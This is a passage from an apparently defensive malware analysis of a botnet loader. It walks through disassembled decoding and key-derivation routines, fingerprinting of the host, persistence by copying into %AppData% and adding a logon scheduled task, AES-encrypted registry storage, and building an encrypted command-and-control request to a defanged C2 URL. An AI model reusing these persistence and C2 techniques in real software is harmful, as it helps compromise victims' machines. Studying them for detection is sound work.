debug025:00BD0CBE                         var_4= dword ptr -4
debug025:00BD0CBE                         data= dword ptr  8
debug025:00BD0CBE                         size= dword ptr  0Ch
debug025:00BD0CBE                         key= dword ptr  10h
debug025:00BD0CBE
debug025:00BD0CBE 55                      push    ebp
debug025:00BD0CBF 89 E5                   mov     ebp, esp
debug025:00BD0CC1 83 EC 1C                sub     esp, 1Ch
debug025:00BD0CC4 53                      push    ebx
debug025:00BD0CC5 56                      push    esi
debug025:00BD0CC6 57                      push    edi
debug025:00BD0CC7 01 FF                   add     edi, edi
debug025:00BD0CC9 8B 5D 0C                mov     ebx, [ebp+size]
debug025:00BD0CCC F7 D0                   not     eax
debug025:00BD0CCE 42                      inc     edx
debug025:00BD0CCF 09 55 F0                or      [ebp+var_10], edx
debug025:00BD0CD2 83 EB 03                sub     ebx, 3
debug025:00BD0CD5 0F AF F7                imul    esi, edi
debug025:00BD0CD8 81 F1 B8 00 00 00       xor     ecx, 0B8h
debug025:00BD0CDE 8B 75 08                mov     esi, [ebp+data]
debug025:00BD0CE1 87 55 EC                xchg    edx, [ebp+var_14]
debug025:00BD0CE4 21 F2                   and     edx, esi
debug025:00BD0CE6
debug025:00BD0CE6                         loc_BD0CE6:                             
debug025:00BD0CE6 41                      inc     ecx
debug025:00BD0CE7 83 FB 00                cmp     ebx, 0               ; ebx is the counter
debug025:00BD0CEA 74 5C                   jz      short loc_BD0D48
debug025:00BD0CEC 49                      dec     ecx
debug025:00BD0CED 1B 55 F4                sbb     edx, [ebp+var_C]
debug025:00BD0CF0 8B 06                   mov     eax, [esi]
debug025:00BD0CF2 33 4D F4                xor     ecx, [ebp+var_C]
debug025:00BD0CF5 01 C9                   add     ecx, ecx
debug025:00BD0CF7 33 45 10                xor     eax, [ebp+key]
debug025:00BD0CFA 09 DF                   or      edi, ebx
debug025:00BD0CFC 89 06                   mov     [esi], eax
debug025:00BD0CFE 2B 55 EC                sub     edx, [ebp+var_14]
debug025:00BD0D01 F7 DF                   neg     edi
debug025:00BD0D03 49                      dec     ecx
debug025:00BD0D04 8B 45 10                mov     eax, [ebp+key]
debug025:00BD0D07 87 55 E8                xchg    edx, [ebp+var_18]
debug025:00BD0D0A 0F AF FA                imul    edi, edx
debug025:00BD0D0D F7 D7                   not     edi
debug025:00BD0D0F EB 03                   jmp     short loc_BD0D14

debug025:00BD0D14
debug025:00BD0D14                         loc_BD0D14:                             
debug025:00BD0D14 C1 C0 07                rol     eax, 7
debug025:00BD0D17 4A                      dec     edx
debug025:00BD0D18 01 F7                   add     edi, esi
debug025:00BD0D1A EB 01                   jmp     short loc_BD0D1D

debug025:00BD0D1D
debug025:00BD0D1D                         loc_BD0D1D:                             
debug025:00BD0D1D 2B 45 0C                sub     eax, [ebp+size]
debug025:00BD0D20 2B 55 FC                sub     edx, [ebp+var_4]
debug025:00BD0D23 87 FF                   xchg    edi, edi
debug025:00BD0D25 F7 D7                   not     edi
debug025:00BD0D27 2D D2 02 96 49          sub     eax, 499602D2h
debug025:00BD0D2C 83 EA 06                sub     edx, 6
debug025:00BD0D2F 01 F7                   add     edi, esi
debug025:00BD0D31 89 45 10                mov     [ebp+key], eax
debug025:00BD0D34 81 E2 80 00 00 00       and     edx, 80h
debug025:00BD0D3A 0B 4D E8                or      ecx, [ebp+var_18]
debug025:00BD0D3D 4B                      dec     ebx
debug025:00BD0D3E 11 C7                   adc     edi, eax
debug025:00BD0D40 29 C7                   sub     edi, eax
debug025:00BD0D42 46                      inc     esi
debug025:00BD0D43 0F AF FB                imul    edi, ebx
debug025:00BD0D46 EB 9E                   jmp     short loc_BD0CE6
debug025:00BD0D48                         ; ------------------------------
debug025:00BD0D48
debug025:00BD0D48                         loc_BD0D48:                             
debug025:00BD0D48 87 55 EC                xchg    edx, [ebp+var_14]
debug025:00BD0D4B 29 F3                   sub     ebx, esi
debug025:00BD0D4D 5F                      pop     edi
debug025:00BD0D4E 5E                      pop     esi
debug025:00BD0D4F 5B                      pop     ebx
debug025:00BD0D50 C9                      leave
debug025:00BD0D51 C2 0C 00                retn    0Ch
debug025:00BD0D51                         decode_data_to_decompress endp</pre>
<p>Next, the decrypted blob of data is decompressed. The stack before the call to RtlDecompressBuffer:</p>
<pre class="height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">0012F270  00000002                              ;compression format
    ;#define COMPRESSION_FORMAT_LZNT1         (0x0002)
0012F274  00C20000  debug027:unk_C20000         ;destination
0012F278  00013600                              ;uncompressed size
0012F27C  00C0857D  debug026:00C0857D           ;compressed buffer
0012F280  0000C76A                              ;compressed size
0012F284  0012F714  Stack[00000BBC]:0012F714    ;final uncompressed size
</pre>
<h2>Stage 2</h2>
<ol>
<li>Collects data about the system;</li>
<li>Copies itself into a randomly named file located in the &ldquo;%AppData%\[random_path]\[random_file_name].exe&rdquo;;</li>
<li>Schedules a task that would run on the current user&rsquo;s next login;</li>
<li>Creates registry keys and stores AES encrypted data (collected in Step 1) in the registry;</li>
<li>Runs the next stage executable from the &ldquo;%AppData%\[random_path]\[random_file_name].exe&rdquo;.</li>
</ol>
<p>An additional detail is that the malware collects data about the machine and creates an interesting structure. For example, on the test machine, the malware creates the following structure:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">00 00 02 00 00 00 06 00  03 3C 80 5E 96 58 91 B6
07 54 A4 00 00 00 03 00  00 00 37 36 34 38 37 2D
33 34 31 2D 38 36 31 39  31 30 33 2D 32 32 30 36
34 00 2C 00 00 00 41 32  32 2D 30 30 30 30 31 00
00 00 00 00 00 00 2C CC  C0 A8 22 31 A6 35 23 98
E5 97 52 11 03 00 00 00  00 00 45 53 07 54 50 6F
04 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 37 34 34 30 32 00
00 00 00 00 00 00 B8 03  00 00 80 5E 96 58 00 01
00 00 EA 32 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 2C 47 6C C7 00 BA  0D F0 AD BA 0D F0 AD BA

+0x02   dwNumberOfProcessors (SYSTEM_INFO) 
+0x06   wProcessorLevel      (SYSTEM_INFO)
+0x08   wProcessorRevision   (SYSTEM_INFO)
+0x0A   VolumeSerialNumber   
+0x0E   InstallDate 		"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+0x12   DigitalProductID	"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"</pre>
<p>An MD5 hash for the above structure is calculated and stored locally. ASCII and UNICODE strings representing formatted MD5 hashes are created. For example, on the test machine:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true">00853D20  39 37 32 39 35 38 41 36  35 38 38 30 42 35 35 41  972958A65880B55A
00853D30  30 45 42 44 35 35 35 39  30 37 38 43 31 37 33 35  0EBD5559078C1735

00853E58  39 00 37 00 32 00 39 00  35 00 38 00 41 00 36 00  9.7.2.9.5.8.A.6.
00853E68  35 00 38 00 38 00 30 00  42 00 35 00 35 00 41 00  5.8.8.0.B.5.5.A.
00853E78  30 00 45 00 42 00 44 00  35 00 35 00 35 00 39 00  0.E.B.D.5.5.5.9.
00853E88  30 00 37 00 38 00 43 00  31 00 37 00 33 00 35 00  0.7.8.C.1.7.3.5.</pre>
<p>Both MD5 hashes are concatenated with the computer name (&lsquo;#&rsquo; is used as a separator). An MD5 hash of this data is calculated. This data becomes the unique GUID that is used by the malware. The malware uses the same algorithm, as it always produces the same result, but the result would be unique per infected system.</p>
<p>Next, the malware creates a randomly named path within &ldquo;%AppData%&rdquo; and copies itself into the randomly named executable file located in that directory. For example, on the test system, the malware created a copy of itself located at:</p>
<p>&ldquo;%AppData%\MfzxAHCb\HQHKWbsv\PMqLMKtj\oPQVNiRgs.exe&rdquo;</p>
<p>An MD5 hash of the newly created copy of the malware is calculated and stored along with the word BOTNET2:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true">0012F628  8A 15 4F AE 3B 78 B4 8D  B1 71 C4 C9 49 99 E0 C0  &egrave;.O&laquo;;x&brvbar;.&brvbar;q-+I&Ouml;a+
0012F638  42 4F 54 4E 45 54 32 00  00 00 00 00 00 00 00 00  BOTNET2.........</pre>
<p>The malware creates a scheduled task that would run on&nbsp;the current user&rsquo;s next login. This is achieved by performing the following sequence of calls:</p>
<pre class="height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">1.CoCreateInstance (creates ITaskScheduler, CLSID {148bd52a-a2ab-11ce-b11f-00aa00530503}, 
  IID {148bd527-a2ab-11ce-b11f-00aa00530503}).
2.ITaskScheduler::NewWorkItem (creates ITask, CLSID_CTask {148BD520-A2AB-11CE-B11F-00AA00530503}, 
  IID_ITask {148BD524-A2AB-11CE-B11F-00AA00530503}).
3.ITask::SetFlags.
4.ITask:SetAccountInformation.
5.ITask::SetWorkingDirectory.
6.ITask::SetApplicationName.
7.ITask::SetMaxRunTime.
8.ITask::CreateTrigger.
9.ITaskTrigger:SetTrigger.
	;PTASK_TRIGGER:
	;Stack[00000F08]:0012E1BC 30 00                   dw 30h     ; cbTriggerSize
	;Stack[00000F08]:0012E1BE 00 00                   dw 0       ; Reserved
	...............................
	;Stack[00000F08]:0012E1D8 04 00 00 00             dd 4       ; rgFlags
	;Stack[00000F08]:0012E1DC 07 00 00 00             dd 7       ; TASK_EVENT_TRIGGER_AT_LOGON
	;Stack[00000F08]:0012E1E0 01 00 00 00             dd 1       ; Type
10.ITask::QueryInterface (CLSID_IPersistFile)
11.IPersistFile::Save.</pre>
<p>Creates the registry keys &ldquo;HKCU\\Software\\Classes\\CLSID\\{[unique_per_system_guid]}&rdquo;. Populates subkeys &ldquo;@&rdquo; , &ldquo;0&rdquo; and &ldquo;1&rdquo;. The data in the registry is encrypted using AES. The registry is used to pass data to the next stage. The AES key is derived from the hard-coded data:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true ">00854028  08 00 99 E3 72 5D A8 0E  FB DF A8 87 42 D4 AA AB  ..&Ouml;pr]&iquest;.v&macr;&iquest;&ccedil;B+&not;&frac12;
00854038  DE AD 35 3F 41 B9 80 5D  85 D4 2E A1 00 E6 E1 8C  &brvbar;&iexcl;5?A&brvbar;&Ccedil;]&agrave;+.&iacute;.&micro;&szlig;&icirc;
00854048  31 00 01 00 53 C3 00 00  39 37 32 39 35 38 41 36  1...S+.</pre>
<p>The derived key is:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true ">0012E750  E3 99 00 08 0E A8 5D 72  87 A8 DF FB AB AA D4 42  p&Ouml;...&iquest;]r&ccedil;&iquest;&macr;v&frac12;&not;+B</pre>
<p>The algorithm for key derivation is:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">.text:0040EA85 0F B6 79 FE             movzx   edi, byte ptr [ecx-2]
.text:0040EA89 0F B6 59 FF             movzx   ebx, byte ptr [ecx-1]
.text:0040EA8D C1 E7 08                shl     edi, 8
.text:0040EA90 0B FB                   or      edi, ebx
.text:0040EA92 0F B6 19                movzx   ebx, byte ptr [ecx]
.text:0040EA95 C1 E7 08                shl     edi, 8
.text:0040EA98 0B FB                   or      edi, ebx
.text:0040EA9A 0F B6 59 01             movzx   ebx, byte ptr [ecx+1]
.text:0040EA9E C1 E7 08                shl     edi, 8
.text:0040EAA1 0B FB                   or      edi, ebx
.text:0040EAA3 89 3C 96                mov     [esi+edx*4], edi
.text:0040EAA6 42                      inc     edx
.text:0040EAA7 83 C1 04                add     ecx, 4
.text:0040EAAA 83 FA 04                cmp     edx, 4
.text:0040EAAD 7C D6                   jl      short loc_40EA85</pre>
<p>Next, the malware runs a copy of itself located in the &ldquo;%AppData%&rdquo; directory:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">.text:00403BA1 8D 55 E4                lea     edx, [ebp+var_1C]
.text:00403BA4 52                      push    edx                        ; lpProcessInformation
.text:00403BA5 8D 45 8C                lea     eax, [ebp+StartupInfo]
.text:00403BA8 50                      push    eax                        ; lpStartupInfo
.text:00403BA9 53                      push    ebx                        ; lpCurrentDirectory
.text:00403BAA 53                      push    ebx                        ; lpEnvironment
.text:00403BAB 68 00 00 00 04          push    CREATE_DEFAULT_ERROR_MODE  ; dwCreationFlags
.text:00403BB0 53                      push    ebx                        ; bInheritHandles
.text:00403BB1 53                      push    ebx                        ; lpThreadAttributes
.text:00403BB2 53                      push    ebx                        ; lpProcessAttributes
.text:00403BB3 68 F0 19 41 00          push    offset CommandLine         ; lpCommandLine
.text:00403BB8 8D 8D 79 FC FF FF       lea     ecx, [ebp+MultiByteStr]
.text:00403BBE 51                      push    ecx                        ; lpApplicationName
    ;"%AppData%\MfzxAHCb\HQHKWbsv\PMqLMKtj\oPQVNiRgs.exe".
.text:00403BBF 89 5D E4                mov     [ebp+var_1C], ebx
.text:00403BC2 89 5D E8                mov     [ebp+var_18], ebx
.text:00403BC5 89 5D EC                mov     [ebp+var_14], ebx
.text:00403BC8 89 5D F0                mov     [ebp+var_10], ebx
.text:00403BCB C7 45 8C 44 00 00 00    mov     [ebp+StartupInfo.cb], 44h
.text:00403BD2 FF 15 60 10 41 00       call    ds:CreateProcessA</pre>
<h2>Stage 3</h2>
<p>This stage creates a payload for the initial C&amp;C request and sends it. Details of the payload creation and malware logic for Stage 3 follow.</p>
<p>The malware calculates computer-specific data (as described in Stage 2) and compares the result to the data stored in &ldquo;KEY_CURRENT_USER\Software\Classes\CLSID\{[computer_unique_guid]}&rdquo;. If equal, the malware proceeds to the next stage.</p>
<p>Data stored in the registry &ldquo;HKEY_CURRENT_USER\Software\Classes\CLSID\{[computer_unique_guid]}\0&rdquo; is enumerated. For example, on the test machine, the size of the data is 0x170, and the encrypted data stored in the registry is:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">00854B78  5F 1D B6 44 5B 87 A7 2E  74 81 51 7F 34 CA CC 9D  _.&brvbar;D[&ccedil;&ordm;.t.Q.4-&brvbar;.
00854B88  FC 74 61 04 C2 61 9E 99  E5 A7 64 02 8E D2 79 05  nta.-aP&Ouml;s&ordm;d.&Auml;-y.
00854B98  68 41 E1 33 96 C7 B7 EB  83 35 07 43 47 1A A8 74  hA&szlig;3&ucirc;&brvbar;+d&acirc;5.CG.&iquest;t
00854BA8  F7 CC B0 27 73 7A 7E 63  60 D7 5B AB 43 1B 41 65  &tilde;&brvbar;&brvbar;'sz~c`+[&frac12;C.Ae
00854BB8  7F D1 A6 8B 85 B1 DE E4  B2 B5 A7 7E 74 B6 44 14  .-&ordf;&iuml;&agrave;&brvbar;&brvbar;S&brvbar;&brvbar;&ordm;~t&brvbar;D.
00854BC8  B5 B8 D3 56 D3 0A 72 CC  62 BF 64 F4 3F 4D F1 D8  &brvbar;++V+.r&brvbar;b+d(?M&plusmn;+
00854BD8  84 2B 45 B8 DB BA 22 C2  B5 95 34 FA 69 85 A6 01  &auml;+E+&brvbar;&brvbar;"-&brvbar;&ograve;4&middot;i&agrave;&ordf;.
00854BE8  02 80 29 90 60 A9 11 13  C3 77 31 6E 06 23 BA 3A  .&Ccedil;).`&not;..+w1n.#&brvbar;:
00854BF8  64 D5 78 FA 2C E3 E5 3A  2B 18 4C 1F 74 31 B3 25  d+x&middot;,ps:+.L.t1&brvbar;%
00854C08  BF 78 2C 45 4F 71 F6 F1  B4 5D 16 E3 CD 40 60 B8  +x,EOq&divide;&plusmn;&brvbar;].p-@`+
00854C18  D9 7B CE AF 87 4F 88 75  FB CC DB 8F AA 33 CF 46  +{+&raquo;&ccedil;O&ecirc;uv&brvbar;&brvbar;.&not;3-F
00854C28  3D 5D 7C 46 85 B5 92 33  B7 B8 E8 E9 5D 88 17 31  =]|F&agrave;&brvbar;&AElig;3++FT]&ecirc;.1
00854C38  46 76 F4 EA 05 D2 71 04  55 B0 BF B3 A1 E9 9C BF  Fv(O.-q.U&brvbar;+&brvbar;&iacute;T&pound;+
00854C48  E7 E6 5A 51 C5 F1 4A DF  CF 46 8B 4F 54 57 57 4F  t&micro;ZQ+&plusmn;J&macr;-F&iuml;OTWWO
00854C58  6E EF 29 C1 BC C0 32 14  B5 3D 84 4C 87 7A 73 BA  nn)-++2.&brvbar;=&auml;L&ccedil;zs&brvbar;
00854C68  40 B2 06 B7 42 85 7C 44  65 1E EE 69 2F 7E 37 B8  @&brvbar;.+B&agrave;|De.ei/~7+
00854C78  E5 A6 CC 26 06 9D 32 B3  71 7E D0 13 45 CF 01 D9  s&ordf;&brvbar;&amp;..2&brvbar;q~-.E-.+
00854C88  77 DA 8C 8E 90 3D 0E D1  F7 FE B1 24 99 20 89 C7  w+&icirc;&Auml;.=.-&tilde;&brvbar;&brvbar;$&Ouml; &euml;&brvbar;
00854C98  41 1D DA 62 66 08 AF 48  C9 F8 5C F8 3D 83 7E 92  A.+bf.&raquo;H+&deg;\&deg;=&acirc;~&AElig;
00854CA8  BF 8C 18 49 CA 81 CE 77  48 93 04 A3 B1 9D 07 60  +&icirc;.I-.+wH&ocirc;.&uacute;&brvbar;..`
00854CB8  5B CE A7 0D 23 09 B6 8D  7E 2E B9 B9 1A 73 3E 84  [+&ordm;.#.&brvbar;.~.&brvbar;&brvbar;.s&gt;&auml;
00854CC8  21 9C EF 83 41 66 72 E1  61 4A 4D 62 4E 0E FF FE  !&pound;n&acirc;Afr&szlig;aJMbN. &brvbar;
00854CD8  C9 F2 15 3B BC 38 11 A2  2B 0C 35 CF F4 EB 35 E5  +=.;+8.&oacute;+.5-(d5s</pre>
<p>The decrypted data is:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">00854E90  00 00 00 00 67 01 00 00  A6 69 46 69 72 73 74 54  ....g...&ordf;iFirstT
00854EA0  69 6D 65 01 6E 6D 6F 64  75 6C 65 73 46 65 74 63  ime.nmodulesFetc
00854EB0  68 65 64 00 66 48 61 73  68 50 45 50 8A 15 4F AE  hed.fHashPEP&egrave;.O&laquo;
00854EC0  3B 78 B4 8D B1 71 C4 C9  49 99 E0 C0 6C 73 7A 42  ;x&brvbar;.&brvbar;q-+I&Ouml;a+lszB
00854ED0  6F 74 6E 65 74 4E 61 6D  65 67 42 4F 54 4E 45 54  otnetNamegBOTNET
00854EE0  32 6D 73 7A 49 6E 73 74  61 6C 6C 50 61 74 68 78  2mszInstallPathx
00854EF0  55 43 3A 5C 44 6F 63 75  6D 65 6E 74 73 20 61 6E  UC:\Documents an
00854F00  64 20 53 65 74 74 69 6E  67 73 5C 69 5C 41 70 70  d Settings\i\App
00854F10  6C 69 63 61 74 69 6F 6E  20 44 61 74 61 5C 4D 66  lication Data\Mf
00854F20  7A 78 41 48 43 62 5C 48  51 48 4B 57 62 73 76 5C  zxAHCb\HQHKWbsv\
00854F30  50 4D 71 4C 4D 4B 74 6A  5C 6F 50 51 56 4E 69 52  PMqLMKtj\oPQVNiR
00854F40  67 73 2E 65 78 65 6C 77  49 6E 73 74 61 6C 6C 50  gs.exelwInstallP
00854F50  61 74 68 58 AA 43 00 3A  00 5C 00 44 00 6F 00 63  athX&not;C.:.\.D.o.c
00854F60  00 75 00 6D 00 65 00 6E  00 74 00 73 00 20 00 61  .u.m.e.n.t.s. .a
00854F70  00 6E 00 64 00 20 00 53  00 65 00 74 00 74 00 69  .n.d. .S.e.t.t.i
00854F80  00 6E 00 67 00 73 00 5C  00 69 00 5C 00 41 00 70  .n.g.s.\.i.\.A.p
00854F90  00 70 00 6C 00 69 00 63  00 61 00 74 00 69 00 6F  .p.l.i.c.a.t.i.o
00854FA0  00 6E 00 20 00 44 00 61  00 74 00 61 00 5C 00 4D  .n. .D.a.t.a.\.M
00854FB0  00 66 00 7A 00 78 00 41  00 48 00 43 00 62 00 5C  .f.z.x.A.H.C.b.\
00854FC0  00 48 00 51 00 48 00 4B  00 57 00 62 00 73 00 76  .H.Q.H.K.W.b.s.v
00854FD0  00 5C 00 50 00 4D 00 71  00 4C 00 4D 00 4B 00 74  .\.P.M.q.L.M.K.t
00854FE0  00 6A 00 5C 00 6F 00 50  00 51 00 56 00 4E 00 69  .j.\.o.P.Q.V.N.i
00854FF0  00 52 00 67 00 73 00 2E  00 65 00 78 00 65 00 00  .R.g.s...e.x.e..

bytes 0 - 3 zeroes,
bytes 4 - 7 the length of the data
bytes 8 - ? data itself.</pre>
<p>Next, the data is tokenized:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">00854D08  01 00 00 00 00 00 00 00  8A 15 4F AE 3B 78 B4 8D  ........&egrave;.O&laquo;;x&brvbar;.
00854D18  B1 71 C4 C9 49 99 E0 C0  42 4F 54 4E 45 54 32 00  &brvbar;q-+I&Ouml;a+BOTNET2.
............................................................................
00854E18  00 00 00 00 00 00 00 00  00 00 00 00 00 43 3A 5C  .............C:\
00854E28  44 6F 63 75 6D 65 6E 74  73 20 61 6E 64 20 53 65  Documents and Se
00854E38  74 74 69 6E 67 73 5C 69  5C 41 70 70 6C 69 63 61  ttings\i\Applica
00854E48  74 69 6F 6E 20 44 61 74  61 5C 4D 66 7A 78 41 48  tion Data\MfzxAH
00854E58  43 62 5C 48 51 48 4B 57  62 73 76 5C 50 4D 71 4C  Cb\HQHKWbsv\PMqL
00854E68  4D 4B 74 6A 5C 6F 50 51  56 4E 69 52 67 73 2E 65  MKtj\oPQVNiRgs.e
00854E78  78 65 00 00 00 00 00 00  00 00 00 00 00 00 00 00  xe..............
............................................................................
00854F28  00 00 43 00 3A 00 5C 00  44 00 6F 00 63 00 75 00  ..C.:.\.D.o.c.u.
00854F38  6D 00 65 00 6E 00 74 00  73 00 20 00 61 00 6E 00  m.e.n.t.s. .a.n.
00854F48  64 00 20 00 53 00 65 00  74 00 74 00 69 00 6E 00  d. .S.e.t.t.i.n.
00854F58  67 00 73 00 5C 00 69 00  5C 00 41 00 70 00 70 00  g.s.\.i.\.A.p.p.
00854F68  6C 00 69 00 63 00 61 00  74 00 69 00 6F 00 6E 00  l.i.c.a.t.i.o.n.
00854F78  20 00 44 00 61 00 74 00  61 00 5C 00 4D 00 66 00   .D.a.t.a.\.M.f.
00854F88  7A 00 78 00 41 00 48 00  43 00 62 00 5C 00 48 00  z.x.A.H.C.b.\.H.
00854F98  51 00 48 00 4B 00 57 00  62 00 73 00 76 00 5C 00  Q.H.K.W.b.s.v.\.
00854FA8  50 00 4D 00 71 00 4C 00  4D 00 4B 00 74 00 6A 00  P.M.q.L.M.K.t.j.
00854FB8  5C 00 6F 00 50 00 51 00  56 00 4E 00 69 00 52 00  \.o.P.Q.V.N.i.R.
00854FC8  67 00 73 00 2E 00 65 00  78 00 65 00 00 00 00 00  g.s...e.x.e.....</pre>
<p>The same operation is performed on the data stored in &ldquo;HKEY_CURRENT_USER\Software\Classes\CLSID\{[computer_unique_guid]}\1&rdquo;. An interesting structure containing pointers to the domain names and common request page are stored in the local array-like structure:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true ">00855EF8  90 67 85 00 D0 67 85 00  10 68 85 00 48 68 85 00  .g&agrave;.-g&agrave;..h&agrave;.Hh&agrave;.
00855F08  2F 6E 65 74 72 65 70 6F  72 74 2E 70 68 70 00 00  /netreport.php..
</pre>
<p>Next, the following interesting function is called:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true">.text:0040FB1B 50                      push    eax                  ; void *
.text:0040FB1C 51                      push    ecx                  ; int
	;db 'I-C957A26036A04#972958A65880B55A0EBD5559078C1735',0
    ;this is computer_name#md5hash as described in the dump.txt
.text:0040FB1D 57                      push    edi                  ; int 
	;'hxxp://soft.kcssoft.biz/netreport.php',0
.text:0040FB1E E8 FD FE FF FF          call    c2</pre>
<p>The first thing the malware does within this function is create a payload for the C&amp;C request. For example, on the test machine, the first part of the plaintext payload (length 0x123) is:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">00856A90  82 A7 69 6C 70 73 7A 42  6F 74 49 44 78 30 49 2D  &eacute;&ordm;ilpszBotIDx0I-
00856AA0  43 39 35 37 41 32 36 30  33 36 41 30 34 23 39 37  C957A26036A04#97
00856AB0  32 39 35 38 41 36 35 38  38 30 42 35 35 41 30 45  2958A65880B55A0E
00856AC0  42 44 35 35 35 39 30 37  38 43 31 37 33 35 6B 6C  BD5559078C1735kl
00856AD0  70 73 7A 56 65 72 73 69  6F 6E 67 32 2E 30 2E 30  pszVersiong2.0.0
00856AE0  2E 30 68 6D 61 69 6E 54  79 70 65 00 67 73 75 62  .0hmainType.gsub
00856AF0  54 79 70 65 00 67 42 69  74 6E 65 73 73 18 20 6B  Type.gBitness. k
00856B00  64 77 54 69 6D 65 73 74  61 6D 70 00 64 44 61 74  dwTimestamp.dDat
00856B10  61 A2 66 4C 65 6E 67 74  68 00 66 6C 70 44 61 74  a&oacute;fLength.flpDat
00856B20  61 40 A7 69 6C 70 73 7A  42 6F 74 49 44 78 30 49  a@&ordm;ilpszBotIDx0I
00856B30  2D 43 39 35 37 41 32 36  30 33 36 41 30 34 23 39  -C957A26036A04#9
00856B40  37 32 39 35 38 41 36 35  38 38 30 42 35 35 41 30  72958A65880B55A0
00856B50  45 42 44 35 35 35 39 30  37 38 43 31 37 33 35 6B  EBD5559078C1735k
00856B60  6C 70 73 7A 56 65 72 73  69 6F 6E 67 32 2E 30 2E  lpszVersiong2.0.
00856B70  30 2E 30 68 6D 61 69 6E  54 79 70 65 00 67 73 75  0.0hmainType.gsu
00856B80  62 54 79 70 65 01 67 42  69 74 6E 65 73 73 18 20  bType.gBitness.
00856B90  6B 64 77 54 69 6D 65 73  74 61 6D 70 00 64 44 61  kdwTimestamp.dDa
00856BA0  74 61 A2 66 4C 65 6E 67  74 68 00 66 6C 70 44 61  ta&oacute;fLength.flpDa
00856BB0  74 61 40 00 									    ta@</pre>
<p>The data has the following format: &ldquo;string&rdquo; + data + 1-character separator. For example, &ldquo;pszBotID&rdquo; (string) + &ldquo;x0I-C957A26036A04#972958A65880B55A0EBD5559078C1735&rdquo; (data) + &ldquo;k&rdquo; (separator; changes for other entries). The malware generates a pseudorandom 9-byte character string and appends it to the data above:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">014CE6D8  09 00 00 00 79 78 65 46  5A 72 76 63 78 82 A7 69  ....yxeFZrvcx&eacute;&ordm;i
014CE6E8  6C 70 73 7A 42 6F 74 49  44 78 30 49 2D 43 39 35  lpszBotIDx0I-C95
014CE6F8  37 41 32 36 30 33 36 41  30 34 23 39 37 32 39 35  7A26036A04#97295
014CE708  38 41 36 35 38 38 30 42  35 35 41 30 45 42 44 35  8A65880B55A0EBD5
014CE718  35 35 39 30 37 38 43 31  37 33 35 6B 6C 70 73 7A  559078C1735klpsz
014CE728  56 65 72 73 69 6F 6E 67  32 2E 30 2E 30 2E 30 68  Versiong2.0.0.0h
014CE738  6D 61 69 6E 54 79 70 65  00 67 73 75 62 54 79 70  mainType.gsubTyp
014CE748  65 00 67 42 69 74 6E 65  73 73 18 20 6B 64 77 54  e.gBitness. kdwT
014CE758  69 6D 65 73 74 61 6D 70  00 64 44 61 74 61 A2 66  imestamp.dData&oacute;f
014CE768  4C 65 6E 67 74 68 00 66  6C 70 44 61 74 61 40 A7  Length.flpData@&ordm;
014CE778  69 6C 70 73 7A 42 6F 74  49 44 78 30 49 2D 43 39  ilpszBotIDx0I-C9
014CE788  35 37 41 32 36 30 33 36  41 30 34 23 39 37 32 39  57A26036A04#9729
014CE798  35 38 41 36 35 38 38 30  42 35 35 41 30 45 42 44  58A65880B55A0EBD
014CE7A8  35 35 35 39 30 37 38 43  31 37 33 35 6B 6C 70 73  5559078C1735klps
014CE7B8  7A 56 65 72 73 69 6F 6E  67 32 2E 30 2E 30 2E 30  zVersiong2.0.0.0
014CE7C8  68 6D 61 69 6E 54 79 70  65 00 67 73 75 62 54 79  hmainType.gsubTy
014CE7D8  70 65 01 67 42 69 74 6E  65 73 73 18 20 6B 64 77  pe.gBitness. kdw
014CE7E8  54 69 6D 65 73 74 61 6D  70 00 64 44 61 74 61 A2  Timestamp.dData&oacute;
014CE7F8  66 4C 65 6E 67 74 68 00  66 6C 70 44 61 74 61 40  fLength.flpData@

+00     length of the random string (9)
+04     pseudo-randomly generated  9 bytes string.
+0D     0
+0E     data (here  data size is 0x123, total structure size is 0x130)</pre>
<p>An additional, 9-byte-long, pseudorandom string is generated:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true ">0012D6D8  78 6A 79 4C 4A 5A 51 61  64 00 00 00 30 D7 12 00  xjyLJZQad</pre>
<p>An MD5 hash of the string is calculated:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true ">0012D6BC  52 37 D7 C2 07 D1 D3 C6  B5 26 F4 FF AC 29 CF CB  R7+-.-+&brvbar;&brvbar;&amp;( &frac14;)--</pre>
<p>The above blob of data is encrypted using AES. The MD5 hash of the second pseudorandom string is used as the key:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">014CFBD0  99 76 C5 58 A7 34 93 BC  54 A6 85 54 DF 79 F6 1A  &Ouml;v+X&ordm;4&ocirc;+T&ordf;&agrave;T&macr;y&divide;.
014CFBE0  B9 A2 47 46 1A FE 81 49  22 77 02 A2 10 ED EF 2D  &brvbar;&oacute;GF.&brvbar;.I"w.&oacute;.fn-
014CFBF0  41 43 25 91 3E 3A F7 DE  9F C2 C8 EB FC 07 75 0F  AC%&aelig;&gt;:&tilde;&brvbar;&fnof;-+dn.u.
014CFC00  87 44 01 66 9F 1B 54 7D  A0 64 D8 02 6C C1 ED BA  &ccedil;D.f&fnof;.T}&aacute;d+.l-f&brvbar;
